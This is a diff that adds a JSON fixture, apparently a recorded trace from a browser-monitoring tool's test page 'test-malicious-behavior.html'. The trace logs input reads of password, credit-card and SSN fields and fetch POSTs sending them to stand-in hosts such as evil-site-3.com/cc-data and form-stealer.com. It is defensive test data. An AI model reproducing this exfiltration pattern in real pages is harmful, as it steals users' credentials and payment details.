@@ -1,0 +1,191 @@
+{
+  "parts": [
+    {
+      "id": "part_html_main",
+      "type": "html",
+      "actions": [
+        {
+          "actionId": "action_1753218924291_9hwz7oj04",
+          "type": "input.value",
+          "data": "id=username"
+        },
+        {
+          "actionId": "action_1753218931278_2onusxcqi",
+          "type": "input.value",
+          "data": "id=password"
+        },
+        {
+          "actionId": "action_1753218933629_fzjo49f90",
+          "type": "input.value",
+          "data": "id=username"
+        },
+        {
+          "actionId": "action_1753218933630_2ttycd8ki",
+          "type": "input.value",
+          "data": "id=password"
+        },
+        {
+          "actionId": "action_1753218933630_sruzogiul",
+          "type": "input.value",
+          "data": "id=creditcard"
+        },
+        {
+          "actionId": "action_1753218935453_n98qpx39m",
+          "type": "form.addEventListener.submit",
+          "data": "id=testForm"
+        },
+        {
+          "actionId": "action_1753218935455_rnbg7xbri",
+          "type": "input.value",
+          "data": "id=form-data"
+        },
+        {
+          "actionId": "action_1753218936988_nh2v15s9r",
+          "type": "input.value",
+          "data": "id=creditcard"
+        },
+        {
+          "actionId": "action_1753218938675_hrqgxvuph",
+          "type": "input.value",
+          "data": "id=ssn"
+        }
+      ]
+    }
+  ],
+  "requests": [
+    {
+      "actionId": "http_1753218911196_pq5ydud0b",
+      "url": "file:///F:/Projects/baby-explorer/src/tests/test-malicious-behavior.html",
+      "requestSource": "document",
+      "method": "GET",
+      "status": 200
+    },
+    {
+      "actionId": "http_1753218924302_vcr96aebc",
+      "url": "file:///F:/api/test-endpoint",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218931278_2onusxcqi",
+      "url": "https://malicious-domain-that-does-not-exist.com/steal-password",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218933630_sruzogiul",
+      "url": "https://evil-site-1.com/user-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -1
+    },
+    {
+      "actionId": "action_1753218933630_sruzogiul",
+      "url": "https://evil-site-2.com/password-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -1
+    },
+    {
+      "actionId": "action_1753218933630_sruzogiul",
+      "url": "https://evil-site-3.com/cc-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218933630_sruzogiul",
+      "url": "https://evil-site-2.com/password-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218933630_sruzogiul",
+      "url": "https://evil-site-3.com/cc-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218935455_rnbg7xbri",
+      "url": "https://form-stealer.com/form-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218938675_hrqgxvuph",
+      "url": "https://rapid-fire-1.com/ssn-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -1
+    },
+    {
+      "actionId": "action_1753218938675_hrqgxvuph",
+      "url": "https://rapid-fire-2.com/ssn-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -1
+    },
+    {
+      "actionId": "action_1753218938675_hrqgxvuph",
+      "url": "https://rapid-fire-3.com/ssn-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -1
+    },
+    {
+      "actionId": "action_1753218938675_hrqgxvuph",
+      "url": "https://rapid-fire-4.com/ssn-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -1
+    },
+    {
+      "actionId": "action_1753218938675_hrqgxvuph",
+      "url": "https://rapid-fire-5.com/ssn-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218938675_hrqgxvuph",
+      "url": "https://rapid-fire-2.com/ssn-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218938675_hrqgxvuph",
+      "url": "https://rapid-fire-5.com/ssn-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218938675_hrqgxvuph",
+      "url": "https://rapid-fire-3.com/ssn-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218938675_hrqgxvuph",
+      "url": "https://rapid-fire-4.com/ssn-data",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    },
+    {
+      "actionId": "action_1753218933630_2ttycd8ki",
+      "url": "https://delayed-evil.com/cc-theft",
+      "requestSource": "fetch",
+      "method": "POST",
+      "status": -999
+    }
+  ],
+  "extraPages": []
+}
